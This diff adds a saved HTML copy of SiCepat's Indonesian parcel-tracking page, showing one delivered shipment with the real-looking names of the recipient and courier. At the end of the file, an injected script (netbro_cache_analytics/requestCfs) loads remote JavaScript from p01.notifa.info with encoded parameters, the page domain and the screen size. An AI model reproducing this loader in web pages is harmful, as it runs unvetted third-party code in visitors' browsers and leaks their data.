@@ -1,0 +1,471 @@
+<html>
+
+<head>
+	<link rel="stylesheet" type="text/css" href="http://sicepat.com/assets/plugins/bootstrap-3.3.5/bootstrap.min.css">
+	<link rel="stylesheet" type="text/css"
+		href="http://sicepat.com/assets/plugins/font-awesome-4.7.0/css/font-awesome.min.css">
+	<link rel="stylesheet" type="text/css" href="http://sicepat.com/assets/plugins/iCheck/square/blue.css">
+	<link rel="stylesheet" type="text/css"
+		href="http://sicepat.com/assets/plugins/datatable/dataTables.bootstrap.min.css">
+	<link rel="stylesheet" type="text/css"
+		href="http://sicepat.com/assets/plugins/datatable/responsive.bootstrap.min.css">
+	<link rel="stylesheet" type="text/css"
+		href="http://sicepat.com/assets/plugins/datatable/fixedHeader.bootstrap.min.css">
+	<link rel="stylesheet" type="text/css" href="http://sicepat.com/assets/plugins/select2/select2-4.0.0.min.css">
+	<link rel="stylesheet" type="text/css"
+		href="http://sicepat.com/assets/plugins/bootstrap-slider/bootstrap-slider.css">
+	<link rel="stylesheet" type="text/css" href="http://sicepat.com/assets/css/app.min.css">
+	<link rel="stylesheet" type="text/css" href="http://sicepat.com/assets/css/skin/_all-skins.min.css">
+	<link rel="stylesheet" type="text/css" href="http://sicepat.com/assets/css/wapp.css?v=10">
+	<link rel="stylesheet" type="text/css" href="http://sicepat.com/application/websicepat/assets/css/index.css?v=9">
+	<link rel="stylesheet" type="text/css" href="http://sicepat.com/assets/plugins/slick/slick.css">
+	<link rel="stylesheet" type="text/css" href="http://sicepat.com/assets/plugins/slick/slick-theme.css">
+	<link rel="stylesheet" type="text/css" href="http://sicepat.com/assets/plugins/jquery-cslider/css/style.css">
+	<link rel="stylesheet" type="text/css" href="http://sicepat.com/assets/plugins/hamburger/hamburger.css">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="icon" href="http://sicepat.com/application/websicepat/assets/img/favicon.png" />
+	<title>Sicepat - Cek Resi</title>
+	<script type='text/javascript'>
+		var base_url = 'http://sicepat.com/';
+            var ltype = 'default';
+                                ltype = 'l-overlay';
+	</script>
+</head>
+
+<body>
+	<div class="ws-container">
+		<div class="ws-header-container">
+			<div class="container">
+				<div class="row">
+					<div class="col-md-2 col-sm-12 text-center">
+						<nav class="navbar visible-sm visible-xs">
+							<div class="navbar-header">
+								<button type="button" class="navbar-toggle collapsed pull-right" data-toggle="collapse" data-target="#ws-navbar-collapse" aria-expanded="false">
+                                    <span class="sr-only">Toggle navigation</span>
+                                    <span class="icon-bar"></span>
+                                    <span class="icon-bar"></span>
+                                    <span class="icon-bar"></span>
+                                </button>
+								<!-- <button id="hamburger" class="hamburger hamburger--collapse navbar-toggle collapsed" onclick="hamburger()" data-toggle="collapse" data-target="#ws-navbar-collapse" aria-expanded="false" type="button">
+                                    <span class="hamburger-box">
+                                        <span class="hamburger-inner"></span>
+                                    </span>
+                                </button> -->
+								<a class="navbar-brand" href="#">
+									<img src="http://sicepat.com/application/websicepat/assets/img/logo-main.png" class="main-logo img-responsive"/>
+                                </a>
+									<div class="btn-group ws-cust-login pull-right hidden visible-xs">
+
+									</div>
+							</div>
+							<div id="ws-navbar-collapse" class="collapse navbar-collapse">
+								<ul class="nav navbar-nav ws-nav-responsive">
+									<li class=""><a href="http://sicepat.com/home">HOME</a></li>
+									<li class="active"><a href="http://sicepat.com/checkAwb">CEK RESI</a></li>
+									<li class=""><a href="http://sicepat.com/deliveryFee">ONGKIR</a></li>
+									<li class=""><a href="http://sicepat.com/service">SERVICE</a></li>
+									<li class=""><a href="http://sicepat.com/location">LOKASI</a></li>
+									<li class=""><a href="http://sicepat.com/contactus">CONTACT</a></li>
+									<!-- <li class=""><a href="http://sicepat.com/promo">PROMO</a></li>
+                                    <li class=""><a href="http://sicepat.com/career">KARIR</a></li> -->
+									<!--<li class=""><a href="">PROMO</a></li>-->
+									<!--<li class=""><a href="">KARIR</a></li>-->
+								</ul>
+							</div>
+						</nav>
+						<a href="#" class="hidden-xs hidden-sm">
+							<img src="http://sicepat.com/application/websicepat/assets/img/logo-main.png" class="main-logo img-responsive"/>
+                        </a>
+					</div>
+					<div class="col-lg-8 col-md-10 hidden-sm">
+						<nav class="navbar hidden-xs hidden-sm">
+							<div class="collapse navbar-collapse">
+								<ul class="nav navbar-nav">
+									<li class=""><a href="http://sicepat.com/home">HOME</a></li>
+									<li class="active"><a href="http://sicepat.com/checkAwb">CEK RESI</a></li>
+									<li class=""><a href="http://sicepat.com/deliveryFee">ONGKIR</a></li>
+									<li class=""><a href="http://sicepat.com/service">SERVICE</a></li>
+									<!-- <li class=" dropdown">
+                                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" onclick="redirect('http://sicepat.com/service')">SERVICE <span class="caret"></span></a>
+                                        <ul class="dropdown-menu">
+                                            <li><a href="http://sicepat.com/service/detail">REG</a></li>
+                                            <li><a href="http://sicepat.com/service/detail/1">BEST</a></li>
+                                            <li><a href="http://sicepat.com/service/detail/2">CARGO</a></li>
+                                            <li><a href="http://sicepat.com/service/detail/3">Cash On Delivery</a></li>
+                                        </ul>
+                                    </li> -->
+									<li class=""><a href="http://sicepat.com/location">LOKASI</a></li>
+									<li class=""><a href="http://sicepat.com/contactus">CONTACT</a></li>
+									<!-- <li class=""><a href="http://sicepat.com/promo">PROMO</a></li>
+                                    <li class=""><a href="http://sicepat.com/career">KARIR</a></li> -->
+
+									<!--<li class=""><a class="link-contact-us" href="">CONTACT US</a></li>-->
+
+									<!--<li class=""><a href=""></a></li>-->
+									<!--<li class=""><a href=""></a></li>-->
+								</ul>
+							</div>
+						</nav>
+					</div>
+					<div class="col-md-2 col-sm-2 hidden visible-lg">
+						<!-- <img src="http://sicepat.com/application/websicepat/assets/img/contact.png" class="ws-image-contact"/> -->
+						<!-- <div class="btn-group ws-hotline"> -->
+						<div class="ws-hotline">
+							Hotline
+						</div>
+						<div class="ws-hotline-number">
+							021-5020-0050
+						</div>
+						<!-- </div> -->
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="ws-main-content">
+			<div class="check-awb-container">
+				<div class="title">
+					<img class="check-awb-icon" src="http://sicepat.com/application/websicepat/assets/img/location@2x.png" style="margin-right: 17px;margin-bottom: 4px;"> Cek Resi</div>
+					<div class="check-awb-content">
+						<div class="container">
+							<form action="http://sicepat.com/checkAwb" method="post" accept-charset="utf-8">
+								<div class="check-awb-wrapper">
+									<div class="awb-input-field">
+										<div class='row '>
+											<div class='col-md-3'></div>
+											<div class='col-md-6'>
+												<div class='input-group'>
+													<div class='input-group-addon'>
+														<img src='http://sicepat.com/application/websicepat/assets/img/doc@2x.png' style='width:17px; height:20px;'></div>
+														<input type='text' name='awb[]' class='form-control input-awb' placeholder='No resi' value=''>           </div>
+													</div>
+													<div class='col-md-3'></div>
+												</div>
+												<div class='row '>
+													<div class='col-md-3'></div>
+													<div class='col-md-6'>
+														<div class='input-group'>
+															<div class='input-group-addon'>
+																<img src='http://sicepat.com/application/websicepat/assets/img/doc@2x.png' style='width:17px; height:20px;'></div>
+																<input type='text' name='awb[]' class='form-control input-awb' placeholder='No resi' value=''>           </div>
+															</div>
+															<div class='col-md-3'></div>
+														</div>
+														<div class='row '>
+															<div class='col-md-3'></div>
+															<div class='col-md-6'>
+																<div class='input-group'>
+																	<div class='input-group-addon'>
+																		<img src='http://sicepat.com/application/websicepat/assets/img/doc@2x.png' style='width:17px; height:20px;'></div>
+																		<input type='text' name='awb[]' class='form-control input-awb' placeholder='No resi' value=''>           </div>
+																	</div>
+																	<div class='col-md-3'></div>
+																</div>
+															</div>
+															<div class="row" style="margin-top:16px;">
+																<div class="col-md-3"></div>
+																<div class="col-md-6">
+																	<div class="row">
+																		<div class="col-md-6"><a id="new-resi"
+																				name="new-resi" class=" "
+																				href="javascript:void(0)"><img src="http://sicepat.com/application/websicepat/assets/img/add@2x.png" style="margin-bottom:2px; width:18px">&nbsp;&nbsp;&nbsp;Tambah resi baru</a>
+																		</div>
+																		<div class="col-md-6">
+																			<div class="btn-wrapper text-right"><input id="btn-check" type="button" class="btn btn-primary btn-check"
+                    value="Lacak" />                   </div>
+																			</div>
+																		</div>
+																	</div>
+																	<div class="col-md-3"></div>
+																</div>
+															</div>
+							</form>
+						</div>
+					</div> <!-- <div class="check-awb-content"> -->
+				</div>
+				<div class="container awb-result" id="awb-result">
+					<div class="awb-detail-title text-center">
+						<div class="container"> Status Pengiriman Anda </div>
+					</div>
+					<div class="awb-detail-sub-title text-center">
+						<div class="container"> Terimakasih telah menggunakan pengiriman SiCepat. Silahkan cek daftar
+							pengiriman Anda </div>
+					</div>
+					<span class="awb-click-info">Silahkan klik salah satu baris untuk melihat detail pengiriman.</span>
+					<div class="table-responsive">
+						<table id="awb-list" class="table table-striped  nowrap ws-table" cellspacing=0 width="100%">
+							<thead>
+								<tr>
+									<th id="seq" class="hidden-xs">No</th>
+									<th id="awb_number" class="">No RESI</th>
+									<th id="service" class="hidden-xs">Layanan</th>
+									<th id="destination" class="">Tujuan</th>
+									<th id="receipt_name" class="hidden-xs">Penerima</th>
+									<th id="receipt_date" class="">Tgl Diterima</th>
+									<th id="receipt_paket" class="hidden-xs">Penerima Paket</th>
+									<th id="status" class="">STATUS</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr class="res-item">
+									<td class="hidden-xs">1</td>
+									<td>123456789012<div class="visible-xs">REG<br>(1 - 2 Hari)</div>
+									</td>
+									<td class="hidden-xs">REG<br>(1 - 2 Hari)</td>
+									<td>SUKOLILO, KOTA SURABAYA<div class="visible-xs">Penerima: KEVIN ISKANDAR</div>
+									</td>
+									<td class="hidden-xs">KEVIN ISKANDAR</td>
+									<td>05-FEB-2020<div class="visible-xs">Penerima Paket: PAKET DITERIMA OLEH [KEVIN -
+											(YBS) YANG BERSANGKUTAN]</div>
+									</td>
+									<td class="hidden-xs">PAKET DITERIMA OLEH [KEVIN - (YBS) YANG BERSANGKUTAN]</td>
+									<td>DELIVERED</td>
+								</tr>
+								<tr class="res-detail">
+									<td colspan="8">
+										<div class="detail-title">TRACKING DETAILS</div>
+										<div class="row">
+											<div class="col-md-5 col-sm-6">
+												<table class="table ws-table">
+													<tr>
+														<th>Tgl Pengiriman</th>
+														<th>Asal</th>
+														<th>Tujuan</th>
+													</tr>
+													<tr>
+														<td>04-Feb-2020 17:08</td>
+														<td>JAKARTA SELATAN</td>
+														<td>SUKOLILO, KOTA SURABAYA</td>
+													</tr>
+												</table>
+												<table class="table ws-table">
+													<tr>
+														<th>Pengirim</th>
+														<th>Penerima</th>
+													</tr>
+													<tr>
+														<td>CHARIS INDONESIA</td>
+														<td>KEVIN ISKANDAR</td>
+													</tr>
+													<tr>
+														<td>JAKARTA SELATAN</td>
+														<td>SUKOLILO, KOTA SURABAYA</td>
+													</tr>
+												</table>
+											</div>
+											<div class="col-md-5 col-md-offset-2 col-sm-6">
+												<table class="table ws-table">
+													<tr>
+														<th colspan="2">History</th>
+													</tr>
+													<tr>
+														<td>04-02-2020 17:08</td>
+														<td>PAKET TELAH DI INPUT (MANIFESTED) DI JAKARTA SELATAN [JAKSEL
+															CIPETE]</td>
+													</tr>
+													<tr>
+														<td>04-02-2020 22:31</td>
+														<td>PAKET KELUAR DARI DKI JAKARTA [JAKSEL CIPETE]</td>
+													</tr>
+													<tr>
+														<td>04-02-2020 23:58</td>
+														<td>PAKET TELAH DI TERIMA DI JAKARTA UTARA [JAKUT PLUIT 1 HUB]
+														</td>
+													</tr>
+													<tr>
+														<td>05-02-2020 15:47</td>
+														<td>PAKET TELAH DI TERIMA DI SURABAYA [SURABAYA MERR]</td>
+													</tr>
+													<tr>
+														<td>05-02-2020 19:24</td>
+														<td>PAKET DIBAWA [SIGESIT - ANDIKA INDRAGIRI WIDAGDO]</td>
+													</tr>
+													<tr>
+														<td>05-02-2020 19:24</td>
+														<td>PAKET DITERIMA OLEH [KEVIN - (YBS) YANG BERSANGKUTAN]</td>
+													</tr>
+												</table>
+											</div>
+										</div>
+							</tbody>
+						</table>
+					</div>
+				</div>
+				<img src="http://sicepat.com/application/websicepat/assets/img/background2.png" class="img-responsive" style="width:100% !important; opacity:0.7;"/></div>
+				<div class="ws-footer-page">
+					<div class="ws-footer-top">
+						<div class="container">
+							<div class="row">
+								<div class="col-md-10">
+									<div class="row">
+										<div class="col-md-3" style="width:30%;">
+											<div class="ws-footer-menu">
+												INFORMASI </div>
+											<ul class='ws-menu-list'>
+												<li><a href="http://sicepat.com/faq">FAQ</a></li>
+												<li><a href="http://sicepat.com/statusSicepat">Kode Status Pengantaran
+														Paket</a></li>
+												<li><a href="http://sicepat.com/termCond">Terms & Conditions</a></li>
+												<!--<li><a href="http://sicepat.com/service"></a></li>-->
+												<li><a href="http://sicepat.com/privacyPolicy">Privacy Policy</a></li>
+											</ul>
+										</div>
+										<div class="col-md-3" style="width:23%;">
+											<div class="ws-footer-menu">
+												PRODUK & LAYANAN </div>
+											<ul class='ws-menu-list'>
+												<li><a href="http://sicepat.com/service">Regular</a></li>
+												<li><a href="http://sicepat.com/service">BEST</a></li>
+												<li><a href="http://sicepat.com/service">Cargo</a></li>
+												<li><a href="http://sicepat.com/service">Cash On Delivery</a></li>
+												<li><a href="http://sicepat.com/service">Sicepat Go</a></li>
+												<li><a href="http://sicepat.com/service">Sicepat Syariah</a></li>
+											</ul>
+										</div>
+										<div class="col-md-2" style="width:17%;">
+											<div class="ws-footer-menu">
+												IKUTI KAMI </div>
+											<ul class='ws-menu-list'>
+												<li><a
+														href="https://www.facebook.com/sicepatekspresofficial/">Facebook</a>
+												</li>
+												<li><a href="https://twitter.com/sicepat_ekspres">Twitter</a></li>
+												<li><a href="https://www.instagram.com/sicepat_ekspres">Instagram</a>
+												</li>
+												<li><a
+														href="https://www.youtube.com/channel/UC9DIPyaNoShFJ5oKsrv7AVg">Youtube</a>
+												</li>
+											</ul>
+										</div>
+										<div class="col-md-3" style="width:30%;">
+											<div class="ws-footer-menu">
+												INFO KONTAK </div>
+											<table class="contact-address-list">
+												<tr>
+													<td><img class="footer-icon" src="http://sicepat.com/application/websicepat/assets/img/address-loc-white@2x.png"></td>
+													<td>Jl. Ir. H. Juanda 3 No. 17-19, RT.008/RW.002, Kel. Kebon Kelapa
+														Kec. Gambir, Jakarta Pusat 10120</td>
+												</tr>
+												<tr>
+													<td><img class="footer-icon" src="http://sicepat.com/application/websicepat/assets/img/phone-white@2x.png"></td>
+													<td>021-5020-0050</td>
+												</tr>
+												<tr>
+													<td><img class="footer-icon" src="http://sicepat.com/application/websicepat/assets/img/line-white@2x.png"></td>
+													<td>@sicepat</td>
+												</tr>
+												<tr>
+													<td><img class="footer-icon" src="http://sicepat.com/application/websicepat/assets/img/message-white@2x.png"></td>
+													<td>Support: customer.care@sicepat.com</td>
+												</tr>
+											</table>
+										</div>
+									</div>
+								</div>
+								<div class="col-md-2 text-right">
+									<div class="ws-store-title">
+										DOWNLOAD APP </div>
+									<div class="row ws-store-menu">
+										<div class="col-md-12 ws-store-play">
+											<a href="https://play.google.com/store/apps/details?id=com.sicepat.android.pelanggan"
+												target="blank">
+												<img class="store-icon" src="http://sicepat.com/application/websicepat/assets/img/playstore@2x.png">
+                            </a>
+										</div>
+										<div class="col-md-12 ws-store-app">
+											<a href="https://itunes.apple.com/id/app/sicepat-express/id1037417977?l=id&mt=8"
+												target="blank">
+												<img class="store-icon" src="http://sicepat.com/application/websicepat/assets/img/appstore@2x.png">
+                            </a>
+										</div>
+									</div>
+								</div>
+							</div>
+							<div class="row">
+								<div class="col-md-12">
+									<div class="ws-footer-divider"></div>
+								</div>
+							</div>
+							<div class="row">
+								<div class="col-md-12 ws-footer-bottom">
+									<i class="fa fa-copyright"></i> 2018 PT. SiCepat Ekspres Indonesia. All rights
+									reserved. 2018 PT. SiCepat Ekspres Indonesia. All rights reserved.
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+
+
+			</div>
+
+			<script>
+				function redirect(url){
+        window.location.href = url;
+    }
+    
+			</script>
+			<script type="text/javascript"
+				src="http://sicepat.com/application/websicepat/assets/js/google-analytics.js"></script>
+			<script type="text/javascript" src="http://sicepat.com/assets/js/jquery-2.1.1.min.js"></script>
+			<script type="text/javascript" src="http://sicepat.com/assets/plugins/bootstrap-3.3.5/bootstrap.js">
+			</script>
+			<script type="text/javascript" src="http://sicepat.com/assets/plugins/iCheck/icheck.min.js"></script>
+			<script type="text/javascript" src="http://sicepat.com/assets/plugins/datatable/jquery.dataTables.js?v=1">
+			</script>
+			<script type="text/javascript" src="http://sicepat.com/assets/plugins/datatable/dataTables.bootstrap.js">
+			</script>
+			<script type="text/javascript"
+				src="http://sicepat.com/assets/plugins/datatable/dataTables.fixedHeader.min.js"></script>
+			<script type="text/javascript"
+				src="http://sicepat.com/assets/plugins/datatable/dataTables.responsive.2.0.2.min.js"></script>
+			<script type="text/javascript" src="http://sicepat.com/assets/plugins/select2/select2.full.js"></script>
+			<script type="text/javascript" src="http://sicepat.com/assets/plugins/bootbox/bootboxbootstrap3.min.js">
+			</script>
+			<script type="text/javascript"
+				src="http://sicepat.com/assets/plugins/bootstrap-slider/bootstrap-slider.min.js"></script>
+			<script type="text/javascript"
+				src="http://sicepat.com/assets/plugins/loading-overlay/loadingoverlay.min.js"></script>
+			<script type="text/javascript" src="http://sicepat.com/assets/js/app.min.js"></script>
+			<script type="text/javascript" src="http://sicepat.com/assets/js/wapp.js?v=6"></script>
+			<script type="text/javascript" src="http://sicepat.com/assets/plugins/slick/slick.min.js"></script>
+			<script type="text/javascript"
+				src="http://sicepat.com/assets/plugins/jquery-cslider/js/modernizr.custom.28468.js"></script>
+			<script type="text/javascript" src="http://sicepat.com/assets/plugins/jquery-cslider/js/jquery.cslider.js">
+			</script>
+			<script type="text/javascript" src="http://sicepat.com/assets/plugins/notify/notify.min.js"></script>
+			<script type="text/javascript">
+				$(document).ready(function() {
+		jQuery("#btn-check").on("click",function(e){var base = jQuery(this);var url = "http://sicepat.com/checkAwb/doSearch";var conf_message = "Are you sure?";
+                var data_url = jQuery(this).attr("data-url");   
+                if (typeof data_url !== typeof undefined && data_url !== false) {
+                    url = jQuery(this).attr("data-url");
+                }
+                var data_conf_msg = jQuery(this).attr("data-conf-msg");
+                if (typeof data_conf_msg !== typeof undefined && data_conf_msg !== false) {
+                    conf_message = jQuery(this).attr("data-conf-msg");
+                }
+                $.wapp.performed.reload(base,url, "post" ,"#awb-result",function(res){
+                                    jQuery('input.icheck').iCheck({
+                                        checkboxClass: 'icheckbox_square-blue',
+                                        radioClass: 'iradio_square-blue',
+                                        increaseArea: '20%' // optional
+                                    });},0);});jQuery("#new-resi").on("click", function(){    jQuery(".awb-input-field .row:last-child input").css("border-top",0);    jQuery(".awb-input-field .row:last-child .input-group-addon").css("border-top",0);    jQuery(".awb-input-field").append("   <div class='row new'>       <div class='col-md-3'></div>       <div class='col-md-6'>           <div class='input-group'>               <div class='input-group-addon'><img src='http://sicepat.com/application/websicepat/assets/img/doc@2x.png' style='width:17px; height:20px;'></div>               <input type='text' name='awb[]' class='form-control input-awb' placeholder='No resi' value=''><div class='input-group-addon trash'><i class='fa fa-trash fa-lg'></i></div>           </div>       </div>       <div class='col-md-3'></div>   </div>")});jQuery(document).on("click", ".trash i", function(){    jQuery(this).parents(".new").remove();});
+              jQuery(".res-detail").hide();
+              jQuery("#awb-list").on("click", ".res-item", function(){
+                  if (jQuery(this).next().is(":visible")) {
+                      jQuery(this).next().slideUp();
+                  }
+                  else {
+                      jQuery(this).next().slideDown();
+                  }
+              });
+              $.wapp.files.filesadded+="[http://sicepat.com/application/websicepat/assets/js/google-analytics.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/js/jquery-2.1.1.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/bootstrap-3.3.5/bootstrap.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/iCheck/icheck.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/jquery.dataTables.js?v=1]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/dataTables.bootstrap.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/dataTables.fixedHeader.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/dataTables.responsive.2.0.2.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/select2/select2.full.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/bootbox/bootboxbootstrap3.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/bootstrap-slider/bootstrap-slider.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/loading-overlay/loadingoverlay.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/js/app.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/js/wapp.js?v=6]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/slick/slick.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/jquery-cslider/js/modernizr.custom.28468.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/jquery-cslider/js/jquery.cslider.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/notify/notify.min.js]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/bootstrap-3.3.5/bootstrap.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/font-awesome-4.7.0/css/font-awesome.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/iCheck/square/blue.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/dataTables.bootstrap.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/responsive.bootstrap.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/datatable/fixedHeader.bootstrap.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/select2/select2-4.0.0.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/bootstrap-slider/bootstrap-slider.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/css/app.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/css/skin/_all-skins.min.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/css/wapp.css?v=10]";$.wapp.files.filesadded+="[http://sicepat.com/application/websicepat/assets/css/index.css?v=9]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/slick/slick.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/slick/slick-theme.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/jquery-cslider/css/style.css]";$.wapp.files.filesadded+="[http://sicepat.com/assets/plugins/hamburger/hamburger.css]";	});
+			</script>
+
+			<script type="text/javascript">
+				if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXc9L8T05s7tSQaDZNFYPYCUjjC3X16X7p0QPIsPsaaJJ%2bwiijqFKm6aVqExRuG3HTUNGDQat4fnqSAKlC6XCw7Qaf1Rf7PTo3WLJ79du8hBlq08HHn%2fn2HyekNymvzuSD%2fCYUDQ7VaDIzngLx5d9xkCgn0nBlf8CDjJNitp4OFys2oTPGX88rr2Z4OUgNwAXLo6ZxWIrha9X9kH2llaFSPjj0gY4MXnC1Moxlh%2bQEuuJcYkZJKyCxkcNrmyok2f7VtSVaIZIcAaxcp772nTi%2bEjqlhom15ME31pm%2bUJsDW%2fsL2VxMPcAm0t3LdC6zONz4VMsVibtrK6E9VHkwe4dEGiPwwrNlyWtuA0FnTqxIOmhcFXXPr52ZEDRgcb7btx6sWI%2bv%2funagRBSjXtvfQGxmMdHdsG1CecOnU%2fpyJIzw4E%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
+			</script>
+</body>
+
+</html>
